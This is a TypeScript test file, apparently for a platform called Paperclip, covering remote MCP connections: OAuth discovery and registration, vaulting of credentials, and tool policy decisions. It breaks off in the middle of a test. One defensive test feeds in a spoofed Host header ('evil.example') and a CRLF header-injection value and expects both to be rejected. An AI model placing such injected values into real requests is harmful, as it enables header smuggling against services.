import { randomUUID } from "node:crypto";
import { once } from "node:events";
import { createServer } from "node:http";
import { Writable } from "node:stream";
import express from "express";
import pino from "pino";
import request from "supertest";
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import {
  activityLog,
  agents,
  authUsers,
  companies,
  companyMemberships,
  connectionGrants,
  companySecretBindings,
  companySecrets,
  companySecretVersions,
  createDb,
  issueThreadInteractions,
  issues,
  principalPermissionGrants,
  secretAccessEvents,
  toolAccessAuditEvents,
  toolCallEvents,
  toolInvocations,
  toolActionRequests,
  toolApplications,
  toolCatalogEntries,
  toolConnectionInstalls,
  toolConnections,
  toolOauthStates,
  toolProfileBindings,
  toolProfileEntries,
  toolProfiles,
  toolRuntimeSlots,
} from "@paperclipai/db";
import { and, eq, sql } from "drizzle-orm";
import { APP_DEFINITIONS, MCP_CONFIG_HELP_PROMPT } from "@paperclipai/shared";
import {
  getEmbeddedPostgresTestSupport,
  startEmbeddedPostgresTestDatabase,
} from "./helpers/embedded-postgres.js";
import { toolAccessService } from "../services/tool-access.js";
import { ComposioApiError, type ComposioClient } from "../services/composio.js";
import { createComposioSessionManager } from "../services/composio-session-manager.js";
import { createToolGatewayService } from "../services/tool-gateway.js";
import { toolAccessPolicyService } from "../services/tool-access-policy.js";
import { toolAccessRoutes } from "../routes/tool-access.js";
import { errorHandler } from "../middleware/index.js";
import { createHttpLogger } from "../middleware/logger.js";
import { HTTP_LOG_REDACT_PATHS } from "../middleware/http-log-redaction.js";

const embeddedPostgresSupport = await getEmbeddedPostgresTestSupport();
const describeEmbeddedPostgres = embeddedPostgresSupport.supported ? describe : describe.skip;

/**
 * PAP-17087 — a connection to an unknown remote MCP server must get the same
 * treatment as a curated one, so these tests deliberately never name a gallery
 * app. Every endpoint below is served by the in-process fixture, so the whole
 * generic path (discovery → registration → authorization → catalog → review) is
 * deterministic and needs no network or vendor credentials.
 */

const PUBLIC_BASE_URL = "https://paperclip.fixture.test";
const REDIRECT_URI = `${PUBLIC_BASE_URL}/api/tools/oauth/callback`;
const CLIENT_METADATA_DOCUMENT_URL = `${PUBLIC_BASE_URL}/api/tools/oauth/client-metadata`;

// A public IP literal keeps the global-fetch protocol fixture deterministic.
// Hostname dispatch is intentionally DNS-pinned even in local/private mode, so
// a made-up test hostname would correctly fail DNS before reaching this mock.
const MCP_ORIGIN = "https://8.8.8.8";
const MCP_URL = `${MCP_ORIGIN}/mcp`;
/** A pathful issuer, so RFC 8414 well-known insertion is actually exercised. */
const ISSUER = `${MCP_ORIGIN}/tenant/acme`;

const FIXTURE_TOOLS = [
  { name: "list_insights", description: "List insights", annotations: { readOnlyHint: true } },
  { name: "create_insight", description: "Create an insight", annotations: { readOnlyHint: false } },
];

type FixtureOptions = {
  /** How the MCP endpoint authenticates. */
  auth?: "public" | "oauth" | "header";
  /** For `auth: "header"`, the header the endpoint requires and its value. */
  requiredHeader?: { name: string; value: string };
  /** Advertise Client ID Metadata Document support on the authorization server. */
  cimd?: boolean;
  /** Advertise a dynamic client registration endpoint. */
  dcr?: boolean;
  /** Serve authorization-server metadata under the RFC 8414 insertion path only. */
  wellKnownStyle?: "rfc8414" | "oidc-suffix";
  /**
   * Advertise this exact string as `authorization_endpoint` (PAP-17099). The
   * value is whatever a hostile server wants — it is never a trusted URL.
   */
  authorizationEndpoint?: string;
  /** Advertise this exact string as `token_endpoint` (PAP-17099). */
  tokenEndpoint?: string;
  /** Confidential-client authentication methods advertised by discovery. */
  tokenEndpointAuthMethods?: string[];
  /** Value the token endpoint returns as the issuer, for `iss` tests. */
  tools?: unknown[];
  /**
   * Fail the token endpoint with this exact body (PAP-17108). The body is
   * whatever a hostile authorization server wants to say, so tests use it to
   * prove none of it reaches the operator.
   */
  tokenFailure?: { status: number; body: Record<string, unknown> };
  /** Fail the dynamic client registration endpoint with this exact body. */
  registrationFailure?: { status: number; body: Record<string, unknown> };
  /** Extra provider-owned callbacks returned alongside the requested callback. */
  registrationExtraRedirectUris?: string[];
};

type FixtureRequest = {
  method: string;
  url: string;
  headers: Record<string, string>;
  body: URLSearchParams | Record<string, unknown> | null;
};

function jsonResponse(payload: unknown, status = 200): Response {
  const body = JSON.stringify(payload);
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: {
      get: (name: string) => (name.toLowerCase() === "content-type" ? "application/json" : null),
    },
    text: async () => body,
    json: async () => payload,
  } as unknown as Response;
}

function unauthorizedMcpResponse(resourceMetadataUrl: string): Response {
  return {
    ok: false,
    status: 401,
    headers: {
      get: (name: string) =>
        name.toLowerCase() === "www-authenticate"
          ? `Bearer resource_metadata="${resourceMetadataUrl}"`
          : null,
    },
    text: async () => "",
    json: async () => ({}),
  } as unknown as Response;
}

function headerRecord(init: RequestInit | undefined): Record<string, string> {
  const raw = init?.headers;
  if (!raw) return {};
  if (raw instanceof Headers) return Object.fromEntries(raw.entries());
  if (Array.isArray(raw)) return Object.fromEntries(raw as Array<[string, string]>);
  return Object.fromEntries(
    Object.entries(raw as Record<string, string>).map(([key, value]) => [key.toLowerCase(), value]),
  );
}

/**
 * A single fetch implementation standing in for an MCP server plus its
 * authorization server. Returns the request log so tests can assert on the exact
 * protocol parameters Paperclip sent (RFC 8707 `resource`, DCR metadata, PKCE).
 */
function installMcpOAuthFixture(options: FixtureOptions = {}) {
  const auth = options.auth ?? "public";
  const requests: FixtureRequest[] = [];
  const issuedCodes = new Map<string, { codeChallenge: string; resource: string | null }>();
  let accessToken: string | null = null;
  const tools = options.tools ?? FIXTURE_TOOLS;
  const resourceMetadataUrl = `${MCP_ORIGIN}/.well-known/oauth-protected-resource/mcp`;

  const authorizationServerMetadata = () => ({
    issuer: ISSUER,
    authorization_endpoint: options.authorizationEndpoint ?? `${ISSUER}/authorize`,
    token_endpoint: options.tokenEndpoint ?? `${ISSUER}/token`,
    ...(options.dcr === false ? {} : { registration_endpoint: `${ISSUER}/register` }),
    ...(options.cimd ? { client_id_metadata_document_supported: true } : {}),
    code_challenge_methods_supported: ["S256"],
    token_endpoint_auth_methods_supported: options.tokenEndpointAuthMethods ?? ["none"],
    scopes_supported: ["mcp:read", "mcp:write"],
  });

  const fetchMock = vi.spyOn(globalThis, "fetch").mockImplementation(async (url, init) => {
    const href = String(url);
    const method = (init?.method ?? "GET").toUpperCase();
    const headers = headerRecord(init);
    const bodyText = typeof init?.body === "string" ? init.body : init?.body?.toString?.() ?? null;
    const parsedBody = bodyText
      ? headers["content-type"]?.includes("json")
        ? (JSON.parse(bodyText) as Record<string, unknown>)
        : new URLSearchParams(bodyText)
      : null;
    requests.push({ method, url: href, headers, body: parsedBody });

    if (href === MCP_URL && method === "POST") {
      if (auth === "oauth" && headers.authorization !== `Bearer ${accessToken}`) {
        return unauthorizedMcpResponse(resourceMetadataUrl);
      }
      if (auth === "header" && options.requiredHeader) {
        const supplied = headers[options.requiredHeader.name.toLowerCase()];
        if (supplied !== options.requiredHeader.value) return unauthorizedMcpResponse(resourceMetadataUrl);
      }
      const rpc = parsedBody as Record<string, unknown>;
      if (rpc.method === "tools/call") {
        return jsonResponse({ jsonrpc: "2.0", id: rpc.id, result: {
          content: [{ type: "text", text: "Fixture meeting data" }],
          structuredContent: { meeting_id: "meeting-1" },
        } });
      }
      return jsonResponse({ jsonrpc: "2.0", id: "paperclip-catalog-refresh", result: { tools } });
    }

    if (href === resourceMetadataUrl) {
      return jsonResponse({ resource: MCP_URL, authorization_servers: [ISSUER] });
    }

    // RFC 8414 inserts the well-known segment before the issuer path; OIDC
    // Discovery appends it. The fixture serves whichever style the test asked
    // for so both discovery orders are covered.
    const rfc8414Url = `${MCP_ORIGIN}/.well-known/oauth-authorization-server/tenant/acme`;
    const oidcSuffixUrl = `${ISSUER}/.well-known/oauth-authorization-server`;
    const servedMetadataUrl = options.wellKnownStyle === "oidc-suffix" ? oidcSuffixUrl : rfc8414Url;
    if (href === servedMetadataUrl) return jsonResponse(authorizationServerMetadata());

    if (href === `${ISSUER}/register` && method === "POST") {
      if (options.registrationFailure) {
        return jsonResponse(options.registrationFailure.body, options.registrationFailure.status);
      }
      if (options.dcr === false) return jsonResponse({ error: "not_supported" }, 404);
      const requested = parsedBody as Record<string, unknown>;
      return jsonResponse({
        client_id: "fixture-dcr-client",
        // A conforming server echoes back what it registered, and Paperclip
        // requires its own callback even when the provider adds a routing URI.
        redirect_uris: [
          ...(requested.redirect_uris as string[]),
          ...(options.registrationExtraRedirectUris ?? []),
        ],
        grant_types: requested.grant_types,
        response_types: requested.response_types,
        token_endpoint_auth_method: requested.token_endpoint_auth_method,
        application_type: requested.application_type,
      });
    }

    if (href === `${ISSUER}/token` && method === "POST") {
      if (options.tokenFailure) return jsonResponse(options.tokenFailure.body, options.tokenFailure.status);
      const body = parsedBody as URLSearchParams;
      const grantType = body.get("grant_type");
      if (grantType === "authorization_code") {
        const issued = issuedCodes.get(body.get("code") ?? "");
        if (!issued) return jsonResponse({ error: "invalid_grant" }, 400);
      }
      accessToken = `fixture-access-${randomUUID()}`;
      return jsonResponse({
        access_token: accessToken,
        refresh_token: "fixture-refresh",
        expires_in: 3600,
        token_type: "Bearer",
        scope: "mcp:read",
      });
    }

    // 404 rather than throw: discovery legitimately probes several well-known
    // paths, and a real server answers the ones it does not serve with a 404.
    return jsonResponse({ error: "not_found" }, 404);
  });

  return {
    fetchMock,
    requests,
    /** Pretend the operator approved the consent screen and got a code back. */
    issueAuthorizationCode(authorizationUrl: string) {
      const parsed = new URL(authorizationUrl);
      const code = `fixture-code-${randomUUID()}`;
      issuedCodes.set(code, {
        codeChallenge: parsed.searchParams.get("code_challenge") ?? "",
        resource: parsed.searchParams.get("resource"),
      });
      return code;
    },
    requestsTo(pathSuffix: string) {
      return requests.filter((entry) => entry.url.endsWith(pathSuffix));
    },
  };
}

async function createCompany(db: ReturnType<typeof createDb>) {
  const company = await db
    .insert(companies)
    .values({
      name: `Generic MCP ${randomUUID()}`,
      issuePrefix: `GM${randomUUID().slice(0, 6).toUpperCase()}`,
    })
    .returning()
    .then((rows) => rows[0]!);
  await db.insert(companyMemberships).values({
    companyId: company.id,
    principalType: "user",
    principalId: "board-user",
    status: "active",
    membershipRole: "admin",
  });
  return company;
}

function createRouteApp(
  db: ReturnType<typeof createDb>,
  deployment?: {
    deploymentMode: "authenticated" | "local_trusted";
    deploymentExposure: "public" | "private";
    remoteHttpEndpointLookup?: NonNullable<Parameters<typeof toolAccessService>[1]>["remoteHttpEndpointLookup"];
    remoteHttpRequest?: NonNullable<Parameters<typeof toolAccessService>[1]>["remoteHttpRequest"];
  },
  requestLogger?: express.RequestHandler,
) {
  const app = express();
  app.use(express.json());
  if (requestLogger) app.use(requestLogger);
  app.use((req, _res, next) => {
    req.actor = {
      type: "board",
      userId: "board-user",
      userName: "Board User",
      userEmail: null,
      isInstanceAdmin: true,
      source: "local_implicit",
    };
    next();
  });
  app.use("/api", toolAccessRoutes(db, { ...deployment }));
  app.use(errorHandler);
  return app;
}

describeEmbeddedPostgres("generic remote MCP connections", () => {
  let db!: ReturnType<typeof createDb>;
  let tempDb: Awaited<ReturnType<typeof startEmbeddedPostgresTestDatabase>> | null = null;

  beforeAll(async () => {
    tempDb = await startEmbeddedPostgresTestDatabase("paperclip-generic-mcp-");
    db = createDb(tempDb.connectionString);
  }, 20_000);

  afterEach(async () => {
    vi.restoreAllMocks();
    vi.unstubAllEnvs();
    await db.delete(toolCallEvents);
    await db.delete(toolInvocations);
    await db.delete(toolActionRequests);
    await db.delete(toolOauthStates);
    await db.delete(secretAccessEvents);
    await db.delete(companySecretBindings);
    await db.delete(companySecretVersions);
    await db.delete(companySecrets);
    await db.delete(activityLog);
    await db.delete(toolAccessAuditEvents);
    await db.delete(toolRuntimeSlots);
    await db.delete(toolConnectionInstalls);
    await db.delete(toolProfileBindings);
    await db.delete(toolProfileEntries);
    await db.delete(toolProfiles);
    await db.delete(toolCatalogEntries);
    await db.delete(toolConnections);
    await db.delete(toolApplications);
    await db.delete(issueThreadInteractions);
    await db.delete(issues);
    await db.delete(principalPermissionGrants);
    await db.delete(companyMemberships);
    await db.delete(agents);
    await db.delete(companies);
    await db.delete(authUsers);
  });

  afterAll(async () => {
    await tempDb?.cleanup();
  });

  async function waitForBlockedMembershipUpdate() {
    for (let attempt = 0; attempt < 80; attempt += 1) {
      const [waiting] = await db.execute<{ waiting: boolean }>(sql`
        SELECT EXISTS (
          SELECT 1
          FROM pg_stat_activity
          WHERE state = 'active'
            AND wait_event_type = 'Lock'
            AND query ILIKE '%company_memberships%'
            AND query ILIKE '%for update%'
        ) AS waiting
      `);
      if (waiting?.waiting) return true;
      await new Promise((resolve) => setTimeout(resolve, 25));
    }
    return false;
  }

  it.each(["mcp-oauth", "mcp-api-key"])("connects Fireflies through %s with vaulted credentials and its stable meeting tools", async (methodKey) => {
    // Keep the real catalog method and governance identity; redirect only its
    // transport URL to the deterministic protocol fixture.
    const method = APP_DEFINITIONS.find((app) => app.slug === "fireflies")!.methods.find((entry) => entry.key === methodKey)!;
    const originalUrl = method.defaults!.serverUrl;
    method.defaults!.serverUrl = MCP_URL;
    try {
      const names = ["fireflies_get_transcripts", "fireflies_get_transcript", "fireflies_get_summary"];
      const availableTools = [...names.map((name) => ({ name, annotations: { readOnlyHint: true } })), { name: "fireflies_share_meeting" }, { name: "fireflies_move_meeting" }];
      const fixture = installMcpOAuthFixture({
        auth: methodKey === "mcp-oauth" ? "oauth" : "header",
        requiredHeader: { name: "Authorization", value: "Bearer fixture-fireflies-key" },
        tools: availableTools,
      });
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const connected = await service.connectGalleryApp(company.id, {
        galleryKey: "fireflies", connectionMethodKey: methodKey,
        ...(methodKey === "mcp-api-key" ? { credentialValues: { "credentials.authorization": "fixture-fireflies-key" } } : {}),
      });
      if (methodKey === "mcp-oauth") {
        const actor = { actorType: "user" as const, actorId: "board-user" };
        const start = await service.startOAuth(company.id, connected.connectionId, { redirectUri: REDIRECT_URI, actor });
        expect(start.registrationSource).toBe("dcr");
        const url = new URL(start.authorizationUrl);
        expect(url.searchParams.get("code_challenge_method")).toBe("S256");
        const completed = await service.completeOAuthCallback({ state: url.searchParams.get("state")!, code: fixture.issueAuthorizationCode(start.authorizationUrl), iss: ISSUER, redirectUri: REDIRECT_URI, actor });
        expect(completed.actions.readOnly.map((action) => action.toolName)).toEqual(names);
      } else {
        expect(connected.actions.readOnly.map((action) => action.toolName)).toEqual(names);
        expect(connected.actions.canMakeChanges.map((action) => action.toolName)).toEqual(["fireflies_share_meeting", "fireflies_move_meeting"]);
        expect(fixture.requestsTo("/mcp").at(-1)?.headers.authorization).toBe("Bearer fixture-fireflies-key");
      }
      const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
      expect(connection!.config).toMatchObject({ sourceTemplateKey: "fireflies", connectionMethodKey: methodKey });
      expect(connection!.credentialSecretRefs.length).toBeGreaterThan(0);
      expect(JSON.stringify({ connected, connection })).not.toContain("fixture-fireflies-key");
      expect(JSON.stringify(connection!.config)).not.toContain("fixture-access-");
      const refreshed = await service.refreshCatalog(connected.connectionId, { actorType: "user", actorId: "board-user" });
      const [agent] = await db.insert(agents).values({ companyId: company.id, name: "Meeting reviewer", role: "engineer", status: "active", adapterType: "process", adapterConfig: {}, runtimeConfig: {} }).returning();
      await service.finishGalleryAppConnection(company.id, connected.connectionId, {
        enabledCatalogEntryIds: refreshed.catalog.filter((entry) => entry.toolName !== "fireflies_move_meeting").map((entry) => entry.id),
        askFirstCatalogEntryIds: refreshed.catalog.filter((entry) => entry.toolName === "fireflies_share_meeting").map((entry) => entry.id),
        access: { agentIds: [agent!.id] },
      }, { actorType: "user", actorId: "board-user" });
      const gateway = createToolGatewayService(db, { toolActionSigningSecret: "fireflies-test-only-signing-secret" });
      for (const toolName of names) {
        await expect(gateway.executeTestCall({ companyId: company.id, connectionId: connected.connectionId, agentId: agent!.id, userId: "board-user", toolName, parameters: {} }))
          .resolves.toMatchObject({ decision: "allowed", result: { data: { structuredContent: { meeting_id: "meeting-1" } } } });
      }
      const policy = toolAccessPolicyService(db);
      const entry = refreshed.catalog.find((item) => item.toolName === "fireflies_share_meeting")!;
      // Re-authentication must retain both Off and Ask first selections.
      // Newly discovered tools still receive the normal connection defaults.
      availableTools.push({ name: "fixture_new_read", annotations: { readOnlyHint: true } });
      if (methodKey === "mcp-oauth") {
        const actor = { actorType: "user" as const, actorId: "board-user" };
        const start = await service.startOAuth(company.id, connected.connectionId, { redirectUri: REDIRECT_URI, actor });
        await service.completeOAuthCallback({ state: new URL(start.authorizationUrl).searchParams.get("state")!, code: fixture.issueAuthorizationCode(start.authorizationUrl), iss: ISSUER, redirectUri: REDIRECT_URI, actor });
      } else {
        const reconnected = await service.reconnectGalleryApp(connected.connectionId, company.id, {
          credentialValues: { "credentials.authorization": "fixture-fireflies-key" },
        });
        expect(reconnected.connection.id).toBe(connected.connectionId);
      }
      await service.refreshCatalog(connected.connectionId, { actorType: "user", actorId: "board-user" });
      await expect(gateway.executeTestCall({ companyId: company.id, connectionId: connected.connectionId, agentId: agent!.id, userId: "board-user", toolName: "fixture_new_read", parameters: {} }))
        .resolves.toMatchObject({ decision: "allowed" });
      await expect(policy.decide({ companyId: company.id, actor: { actorType: "agent", actorId: agent!.id, agentId: agent!.id }, request: { connectionId: connected.connectionId, catalogEntryId: entry.id, toolName: entry.toolName } }))
        .resolves.toMatchObject({ allowed: false, decision: "require_approval" });
      const offEntry = refreshed.catalog.find((item) => item.toolName === "fireflies_move_meeting")!;
      await expect(policy.decide({ companyId: company.id, actor: { actorType: "agent", actorId: agent!.id, agentId: agent!.id }, request: { connectionId: connected.connectionId, catalogEntryId: offEntry.id, toolName: offEntry.toolName } }))
        .resolves.toMatchObject({ allowed: false, decision: "deny" });
      await expect(gateway.executeTestCall({ companyId: randomUUID(), connectionId: connected.connectionId, agentId: agent!.id, userId: "board-user", toolName: names[0]!, parameters: {} })).rejects.toThrow();
      await service.archiveConnection(connected.connectionId, company.id);
      await expect(gateway.executeTestCall({ companyId: company.id, connectionId: connected.connectionId, agentId: agent!.id, userId: "board-user", toolName: names[0]!, parameters: {} })).rejects.toThrow();
      expect((await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId)))[0]?.status).toBe("archived");
    } finally {
      method.defaults!.serverUrl = originalUrl;
    }
  });

  it("discovers every tool for a public unknown endpoint without activating the draft", async () => {
    installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const result = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture MCP" });

    expect(result.auth ?? null).toBeNull();
    expect(result.actions.readOnly.map((action) => action.toolName)).toEqual(["list_insights"]);
    expect(result.actions.canMakeChanges.map((action) => action.toolName)).toEqual(["create_insight"]);
    expect(result.suggestedDefaults).toMatchObject({ askFirstRiskLevels: [] });

    const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, result.connectionId));
    expect(connection).toMatchObject({ transport: "mcp_remote", authKind: "none", status: "draft" });
    expect(connection!.config).toMatchObject({ quarantineNewEntries: false, unverifiedServer: true });
    // No curated definition was consulted: nothing recorded a template key, so
    // this connection cannot be depending on gallery metadata for anything.
    expect(connection!.config).not.toHaveProperty("sourceTemplateKey");
    expect(connection!.config).not.toHaveProperty("connectionMethodKey");
    await expect(service.listConnectionGrants(result.connectionId, company.id)).resolves.toMatchObject({
      grants: [expect.objectContaining({ kind: "organization", isDefault: true, credentialSecretRefs: [] })],
    });
    const profiles = await db.select().from(toolProfiles).where(eq(
      toolProfiles.profileKey,
      `app:${result.connectionId}`,
    ));
    expect(profiles).toEqual([]);
  });

  it.each(["organization", "user"] as const)("vaults a credential-bearing MCP URL for %s and never returns or logs its token", async (grantKind) => {
    const secretUrl = `${MCP_URL}?token=zapier-secret&region=us`;
    const publicUrl = `${MCP_URL}?region=us`;
    const requests: string[] = [];
    vi.spyOn(globalThis, "fetch").mockImplementation(async (url, init) => {
      requests.push(String(url));
      if (String(url) === secretUrl && (init?.method ?? "GET").toUpperCase() === "POST") {
        return jsonResponse({
          jsonrpc: "2.0",
          id: "paperclip-catalog-refresh",
          result: { tools: FIXTURE_TOOLS },
        });
      }
      return jsonResponse({ error: "not_found" }, 404);
    });
    const company = await createCompany(db);
    const app = createRouteApp(db, {
      deploymentMode: "local_trusted",
      deploymentExposure: "private",
    });

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({ link: secretUrl, name: "Token URL fixture", grantKind })
      .expect(201);

    expect(requests).toContain(secretUrl);
    expect(JSON.stringify(response.body)).not.toContain("zapier-secret");
    expect(response.body.connection.config.url).toBe(publicUrl);
    expect(response.body.connection.transportConfig.url).toBe(publicUrl);
    expect(response.body.connection.credentialRefs).toEqual([
      expect.objectContaining({ placement: "url", name: "remote.url", key: "url" }),
    ]);

    const [connection] = await db.select().from(toolConnections).where(eq(
      toolConnections.id,
      response.body.connectionId,
    ));
    expect(connection!.config.url).toBe(publicUrl);
    const expectedRefs = [expect.objectContaining({ configPath: "remote.url", label: "MCP server URL" })];
    expect(connection!.credentialSecretRefs).toEqual(grantKind === "user" ? [] : expectedRefs);
    const grants = await db.select().from(connectionGrants).where(eq(
      connectionGrants.connectionId,
      response.body.connectionId,
    ));
    expect(grants).toEqual([
      expect.objectContaining({
        kind: grantKind,
        credentialSecretRefs: expectedRefs,
        ...(grantKind === "user" ? { subjectUserId: "board-user" } : {}),
      }),
    ]);
    expect(await db.select().from(companySecrets)).toHaveLength(1);
    expect(JSON.stringify(await db.select().from(activityLog))).not.toContain("zapier-secret");
  });

  it("keeps a generated Zapier URL attached to the curated Zapier identity", async () => {
    const secretUrl = "https://mcp.zapier.com/api/v1/connect?token=zapier-secret";
    const publicUrl = "https://mcp.zapier.com/api/v1/connect";
    const company = await createCompany(db);
    const app = createRouteApp(db, {
      deploymentMode: "local_trusted",
      deploymentExposure: "private",
      remoteHttpEndpointLookup: async () => [{ address: "8.8.8.8", family: 4 }],
      remoteHttpRequest: async (url, init) => {
        if (url === secretUrl && (init.method ?? "GET").toUpperCase() === "POST") {
          const body = JSON.parse(String(init.body));
          if (body.method === "notifications/initialized") return new Response(null, { status: 202 });
          return jsonResponse({
            jsonrpc: "2.0",
            id: body.id,
            result: body.method === "initialize" ? { protocolVersion: "2025-06-18" } : { tools: FIXTURE_TOOLS },
          });
        }
        return jsonResponse({ error: "not_found" }, 404);
      },
    });

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({
        galleryKey: "zapier",
        connectionMethodKey: "generated-url",
        link: secretUrl,
        name: "Zapier for the company",
      });

    expect(response.status, JSON.stringify(response.body)).toBe(201);

    expect(response.body.connection.config).toMatchObject({
      url: publicUrl,
      sourceTemplateKey: "zapier",
      connectionMethodKey: "generated-url",
    });
    expect(JSON.stringify(response.body)).not.toContain("zapier-secret");

    const [application] = await db.select().from(toolApplications).where(eq(
      toolApplications.id,
      response.body.application.id,
    ));
    expect(application).toMatchObject({
      applicationKey: expect.stringMatching(/^app-gallery:zapier:/),
      metadata: expect.objectContaining({
        sourceTemplateKey: "zapier",
        galleryKey: "zapier",
      }),
    });
  });

  it("rejects a generated URL for curated methods that do not declare one", async () => {
    const company = await createCompany(db);
    const app = createRouteApp(db, {
      deploymentMode: "local_trusted",
      deploymentExposure: "private",
    });

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({
        galleryKey: "notion",
        connectionMethodKey: "mcp-oauth",
        link: "https://mcp.notion.com/mcp",
      })
      .expect(400);

    expect(response.body.error).toContain("does not accept a provider-generated connection URL");
    await expect(db.select().from(toolApplications)).resolves.toHaveLength(0);
  });

  it("emits DNS guidance for a real NXDOMAIN failure", async () => {
    const company = await createCompany(db);
    const app = createRouteApp(db, {
      deploymentMode: "local_trusted",
      deploymentExposure: "private",
    });

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({ link: "https://qa-nonexistent.invalid/mcp", name: "Missing DNS fixture" });

    // Public-mode preflight returns 400; local-mode platform fetch reports the
    // same failure from the health check as 502. The machine code is the stable
    // UI contract across both paths.
    expect([400, 502]).toContain(response.status);
    expect(response.body).toMatchObject({
      details: { code: "remote_http_dns_failed" },
    });
    expect(response.body.error).not.toBe("fetch failed");
    await expect(db.select().from(toolApplications)).resolves.toHaveLength(0);
  });

  it("automatically gives a new connection a distinct name when its default is already used", async () => {
    installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    await db.insert(toolApplications).values({
      companyId: company.id,
      applicationKey: `existing:${randomUUID()}`,
      name: "Taken fixture name",
      type: "mcp_http",
      status: "active",
      metadata: {},
    });
    const app = createRouteApp(db, {
      deploymentMode: "local_trusted",
      deploymentExposure: "private",
    });

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({ link: MCP_URL, name: "Taken fixture name" })
      .expect(201);

    expect(response.body.application.name).toBe("Taken fixture name (2)");
    expect(response.body.connection.name).toBe("Taken fixture name (2)");
    await expect(
      db.select({ name: toolApplications.name })
        .from(toolApplications)
        .where(eq(toolApplications.companyId, company.id)),
    ).resolves.toEqual(expect.arrayContaining([
      { name: "Taken fixture name" },
      { name: "Taken fixture name (2)" },
    ]));
  });

  it("emits deployment guidance without exposing server env-var names", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", "");
    vi.stubEnv("PAPERCLIP_AUTH_PUBLIC_BASE_URL", "");
    vi.stubEnv("BETTER_AUTH_URL", "");
    vi.stubEnv("BETTER_AUTH_BASE_URL", "");
    vi.stubEnv("PAPERCLIP_MANAGED_RUNTIME_PUBLIC_URL", "");
    const app = createRouteApp(db, {
      deploymentMode: "local_trusted",
      deploymentExposure: "private",
    });

    const response = await request(app)
      .get("/api/tools/oauth/client-metadata")
      .set("Host", "paperclip.example.test")
      .expect(422);

    expect(response.body).toMatchObject({
      details: { code: "oauth_redirect_origin_unsupported" },
    });
    expect(JSON.stringify(response.body)).not.toContain("PAPERCLIP_PUBLIC_URL");
  });

  it("stores a bearer key as a secret and never reads it back", async () => {
    installMcpOAuthFixture({
      auth: "header",
      requiredHeader: { name: "Authorization", value: "Bearer fixture-key-123" },
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const result = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture bearer",
      authMode: "bearer",
      credentialValues: { "credentials.authorization": "fixture-key-123" },
    });

    expect(result.catalog).toHaveLength(2);
    const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, result.connectionId));
    expect(connection!.authKind).toBe("api_key");
    expect(JSON.stringify(connection!.config)).not.toContain("fixture-key-123");
    expect(JSON.stringify(connection!.credentialRefs)).not.toContain("fixture-key-123");
    expect(JSON.stringify(result.connection)).not.toContain("fixture-key-123");
    expect(connection!.credentialSecretRefs.map((ref) => ref.configPath)).toEqual(["credentials.authorization"]);
  });




  it("stores custom header values as secrets and shows only header names", async () => {
    installMcpOAuthFixture({
      auth: "header",
      requiredHeader: { name: "X-Api-Key", value: "phx_fixture_secret" },
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const result = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture headers",
      authMode: "custom_headers",
      credentialValues: { "headers.X-Api-Key": "phx_fixture_secret" },
    });

    expect(result.catalog).toHaveLength(2);
    const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, result.connectionId));
    const serialized = JSON.stringify({
      config: connection!.config,
      credentialRefs: connection!.credentialRefs,
      credentialSecretRefs: connection!.credentialSecretRefs,
    });
    expect(serialized).not.toContain("phx_fixture_secret");
    // The header *name* is what review and diagnostics get to show.
    expect(serialized).toContain("X-Api-Key");
  });

  it("rejects header names Paperclip refuses to send", async () => {
    installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    await expect(service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture unsafe header",
      credentialValues: { "headers.Host": "evil.example" },
    })).rejects.toMatchObject({ status: 400 });

    await expect(service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture split header",
      credentialValues: { "headers.X-Api-Key": "abc\r\nX-Injected: 1" },
    })).rejects.toMatchObject({ status: 400 });

    // Nothing partial survived either rejection.
    await expect(db.select().from(toolConnections)).resolves.toHaveLength(0);
    await expect(db.select().from(companySecrets)).resolves.toHaveLength(0);
  });

  it("registers dynamically for an unknown OAuth endpoint and completes the flow", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture OAuth" });
    // Discovery succeeded, so the wizard gets a real sign-in branch rather than
    // an error, and it already knows which server it is about to trust.
    expect(connected.auth).toMatchObject({ kind: "oauth", issuer: ISSUER, resource: MCP_URL });

    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    expect(start.registrationSource).toBe("dcr");
    expect(start.issuer).toBe(ISSUER);

    const registration = fixture.requestsTo("/register");
    expect(registration).toHaveLength(1);
    expect(registration[0]!.body).toMatchObject({
      redirect_uris: [REDIRECT_URI],
      token_endpoint_auth_method: "none",
      application_type: "web",
    });

    const authorizationUrl = new URL(start.authorizationUrl);
    expect(authorizationUrl.origin + authorizationUrl.pathname).toBe(`${ISSUER}/authorize`);
    expect(authorizationUrl.searchParams.get("client_id")).toBe("fixture-dcr-client");
    expect(authorizationUrl.searchParams.get("code_challenge_method")).toBe("S256");
    expect(authorizationUrl.searchParams.get("code_challenge")).toBeTruthy();
